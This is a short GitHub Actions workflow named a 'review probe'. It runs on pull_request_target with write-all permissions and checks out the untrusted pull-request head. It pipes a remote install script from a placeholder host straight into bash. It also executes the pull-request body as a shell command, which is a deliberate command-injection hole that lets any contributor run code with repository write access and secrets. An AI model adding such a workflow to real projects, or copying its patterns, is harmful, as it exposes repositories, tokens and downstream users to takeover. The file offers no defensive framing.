name: DCOIR Review probe 20260627K
on:
  pull_request_target:
permissions: write-all
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          ref: ${{ github.head_ref }}
      - name: Install helper
        run: curl -fsSL https://downloads.example.invalid/install.sh | bash
      - name: Echo PR body into shell
        run: sh -c "${{ github.event.pull_request.body }}"
